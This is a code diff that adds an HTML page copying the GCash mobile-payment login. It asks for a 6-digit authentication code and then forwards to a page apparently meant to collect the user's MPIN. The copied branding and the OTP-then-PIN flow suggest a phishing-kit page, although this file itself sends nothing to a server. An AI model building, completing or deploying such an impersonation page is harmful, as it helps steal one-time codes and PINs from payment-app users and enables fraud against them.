@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>GCash OTP - Step 2</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #ece8e4;
+    }
+
+    .header {
+      background-color: #0056e4;
+      padding: 80px 0;
+      text-align: center;
+    }
+
+    .header img {
+      width: 120px;
+    }
+
+    .gcash-box {
+      background-color: #ffffff;
+      width: 90%;
+      max-width: 400px;
+      margin: -60px auto 30px auto;
+      padding: 25px 25px 35px;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      position: relative;
+      z-index: 2;
+    }
+
+    .title {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 4px;
+      text-align: left;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .otp-box {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+
+    .otp-box input {
+      width: 20px;
+      height: 45px;
+      border: none;
+      border-bottom: 3px solid #0e0101;
+      background: transparent;
+      text-align: center;
+      font-size: 22px;
+    }
+
+    .otp-box input:focus {
+      outline: none;
+      border-bottom: 2px solid #0056e4;
+    }
+
+    .btn {
+      margin-top: 20px;
+      padding: 12px;
+      width: 100%;
+      background: linear-gradient(to right, #4a9fff, #1a73e8);
+      border: none;
+      color: white;
+      font-weight: bold;
+      font-size: 14px;
+      border-radius: 25px;
+      cursor: pointer;
+      text-decoration: underline;
+    }
+
+    .btn:hover {
+      background: linear-gradient(to right, #1a73e8, #0047b3);
+    }
+
+    .resend {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #555;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="assets/gcash.png" alt="GCash Logo">
+  </div>
+
+  <div class="gcash-box">
+    <p class="title">Login to pay with GCash</p>
+    <p class="subtitle">Enter the 6-digit authentication code sent to your registered mobile number.</p>
+
+    <form action="gcash_mpin_csg.html">
+      <div class="otp-box">
+        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" required>
+        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" required>
+        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" required>
+        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" required>
+        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" required>
+        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" required>
+      </div>
+      <button type="submit" class="btn">NEXT</button>
+    </form>
+
+    <div class="resend">Didn't get the code? Resend 30s</div>
+  </div>
+
+  <script>
+    // Automatically move to the next input when one is filled
+    const inputs = document.querySelectorAll('.otp-box input');
+
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+  </script>
+</body>
+</html>
